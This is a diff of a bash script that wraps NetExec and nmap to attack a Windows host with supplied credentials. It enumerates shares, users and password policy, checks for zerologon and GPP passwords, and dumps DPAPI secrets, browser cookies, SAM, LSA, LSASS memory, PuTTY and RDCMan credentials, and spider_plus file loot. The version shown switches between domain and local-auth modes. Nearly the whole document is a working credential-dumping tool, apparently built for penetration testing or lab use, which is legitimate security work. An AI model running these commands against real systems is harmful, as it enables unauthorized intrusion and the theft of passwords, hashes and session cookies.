@@ -1,81 +1,111 @@
 #!/usr/bin/env bash
 # Author: strikoder
 # File: auth_smb.sh
-# Usage: ./auth_smb.sh -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>] [--local-auth]
+# Usage: ./auth_smb.sh -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>]
 set -euo pipefail
 
-IP=""; USER=""; PASS=""; DOMAIN=""; LOCAL=""
+IP=""; USER=""; PASS=""; DOMAIN=""
 while [[ $# -gt 0 ]]; do
   case "$1" in
     -t) IP="$2"; shift 2 ;;
     -u) USER="$2"; shift 2 ;;
     -p) PASS="$2"; shift 2 ;;
     -d) DOMAIN="$2"; shift 2 ;;
-    --local-auth) LOCAL="--local-auth"; shift ;;
-    *) echo "Usage: $0 -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>] [--local-auth]"; exit 1 ;;
+    *) echo "Usage: $0 -t <IP> -u <USER> -p <PASS> [-d <DOMAIN>]"; exit 1 ;;
   esac
 done
 [[ -z "$IP" || -z "$USER" || -z "$PASS" ]] && { echo "Missing -t/-u/-p"; exit 1; }
 command -v nxc >/dev/null || { echo "nxc not in PATH"; exit 1; }
 
-TS="$(date +%F_%H-%M-%S)"
-OUT="results_auth/${IP}_${TS}"
-mkdir -p "$OUT"
-log(){ echo -e "[*] $*"; }
+log(){ echo -e "\n==== $* ====\n"; }
 
-# Collect help & module list once
-HELP="$(nxc smb -h 2>&1 || true)"
-MODULES="$(nxc smb -L 2>/dev/null || true)"
-
-have_flag(){ grep -q -- "$1" <<<"$HELP"; }
-have_mod(){ grep -q -E "^\s*-$1\s" <<<"$MODULES"; }   # nxc lists as: -modname  description
-
-base=()
-[[ -n "$DOMAIN" ]] && base+=(-d "$DOMAIN")
-[[ -n "$LOCAL"  ]] && base+=("$LOCAL")
-base+=( -u "$USER" -p "$PASS" )
-
-log "Running base recon"
-FLAGS=()
-for f in --shares --users --groups --pass-pol --loggedon-users --qwinsta --wdigest --gpp-password --zerologon; do
-  have_flag "$f" && FLAGS+=("$f")
-done
-# run base probes (auto-filtered)
-nxc smb "$IP" "${base[@]}" "${FLAGS[@]}" 2>&1 | tee "$OUT/nxc_base.txt" || true
-
-log "Running DPAPI variants"
-# dpapi (global), cookies, nosystem, local-auth+nosystem if requested
-if have_flag "--dpapi"; then
-  nxc smb "$IP" "${base[@]}" --dpapi                2>&1 | tee "$OUT/nxc_dpapi.txt"          || true
-  nxc smb "$IP" "${base[@]}" --dpapi cookies        2>&1 | tee "$OUT/nxc_dpapi_cookies.txt"  || true
-  nxc smb "$IP" "${base[@]}" --dpapi nosystem       2>&1 | tee "$OUT/nxc_dpapi_nosys.txt"    || true
-  # If caller passed --local-auth we already included it in base[]. This line shows explicit local-auth+nosystem combo:
-  nxc smb "$IP" "${base[@]}" --dpapi nosystem       2>&1 | tee "$OUT/nxc_dpapi_local_nosys.txt" || true
+# Auth modes
+if [[ -n "$DOMAIN" ]]; then
+  MODE="domain"
+  BASE=(-d "$DOMAIN" -u "$USER" -p "$PASS")
+else
+  MODE="local"
+  BASE=(--local-auth -u "$USER" -p "$PASS")
 fi
+log "Auth mode: $MODE"
 
-log "Running modules (auto-detected)"
-# Priv notes:
-#  - spider_plus: file spider/loot after auth
-#  - sam: needs local admin (or SeBackupPrivilege via backup_operator approach)
-#  - lsa/lsass/putty: need local admin; lsass often uses procdump/lsassy (depends on build)
-#  - backup_operator: works if token has SeBackupPrivilege (not full admin)
-#  - ldapi: needs local admin; use --local-auth for local accounts
-#  - rdcman: loot RDCMan creds/files if present
-mods=( spider_plus sam lsa lsass putty backup_operator ldapi rdcman )
-for m in "${mods[@]}"; do
-  if have_mod "$m"; then
-    log "nxc -M $m"
-    nxc smb "$IP" "${base[@]}" -M "$m" 2>&1 | tee "$OUT/mod_${m}.txt" || true
+# Capabilities
+HELP="$(nxc smb -h 2>&1 || true)"
+have_flag(){ grep -q -- "$1" <<<"$HELP"; }
+have_mod(){ nxc smb -L 2>/dev/null | awk '{print $1}' | sed 's/^-//' | grep -q "^$1$"; }
+
+## 1) SMB recon (per-flag, clear output)
+for f in --shares --users --pass-pol --loggedon-users --qwinsta --wdigest --gpp-password --zerologon; do
+  if have_flag "$f"; then
+    log "Now running SMB flag: $f"
+    nxc smb "$IP" "${BASE[@]}" "$f" || true
+  else
+    log "SMB flag not supported in this build: $f"
   fi
 done
 
-log "Done. Results -> $OUT"
+## 1b) LDAP recon (only when domain auth)
+if [[ "$MODE" == "domain" ]]; then
+  if nxc ldap -h 2>&1 | grep -q -- "--groups"; then
+    log "Now running LDAP: --groups"
+    nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups || true
+  else
+    log "LDAP --groups not supported in this build"
+  fi
+else
+  log "Skipping LDAP --groups (needs domain auth)"
+fi
 
-# Quick tips printed at end
-cat <<'EOT' > "$OUT/READ_ME.txt"
-Notes:
-- SAM/LSA/LSASS/PUTTY/LDAPi modules generally require local admin; use --local-auth if creds are local account.
-- backup_operator module leverages SeBackupPrivilege (no full admin needed).
-- spider_plus can pull interesting files post-auth (paths depend on target).
-- Use domain with -d if creds are domain accounts; omit and add --local-auth for local users.
+## 2) DPAPI variants
+if have_flag "--dpapi"; then
+  log "DPAPI: base"
+  nxc smb "$IP" "${BASE[@]}" --dpapi || true
+
+  log "DPAPI: cookies"
+  nxc smb "$IP" "${BASE[@]}" --dpapi cookies || true
+
+  log "DPAPI: nosystem"
+  nxc smb "$IP" "${BASE[@]}" --dpapi nosystem || true
+
+  if [[ "$MODE" == "local" ]]; then
+    log "DPAPI: nosystem (explicit local-auth)"
+    nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" --dpapi nosystem || true
+  else
+    log "Skipping DPAPI local-auth variant (domain mode)"
+  fi
+fi
+
+## 3) Modules (auto-detected)
+NOT_AVAILABLE=()
+for m in spider_plus sam lsa lsass putty backup_operator ldapi rdcman; do
+  if have_mod "$m"; then
+    log "Module: $m"
+    nxc smb "$IP" "${BASE[@]}" -M "$m" || true
+  else
+    NOT_AVAILABLE+=("$m")
+  fi
+done
+
+if [[ ${#NOT_AVAILABLE[@]} -gt 0 ]]; then
+  log "Modules not supported by this nxc build (or need --local-auth/admin): ${NOT_AVAILABLE[*]}"
+fi
+
+
+## 4) (Optional) Nmap helpers
+if command -v nmap >/dev/null; then
+  log "Nmap: smb-enum-shares,smb-enum-users,smb-os-discovery"
+  nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery "$IP" || true
+  log "Nmap: smb-security-mode"
+  nmap -p445 --script smb-security-mode "$IP" || true
+  log "Nmap: smb-protocols"
+  nmap -p445 --script smb-protocols "$IP" || true
+fi
+
+# Final notes (printed only)
+log "Summary / Tips"
+cat <<'EOT'
+- Domain mode is used when -d <DOMAIN> is provided; otherwise the script uses --local-auth.
+- LDAP --groups runs only in domain mode.
+- Some modules need local admin (sam/lsa/lsass/putty/ldapi). backup_operator needs SeBackupPrivilege.
+- DPAPI variants run in both modes; the explicit local-auth variant runs only in local mode.
 EOT
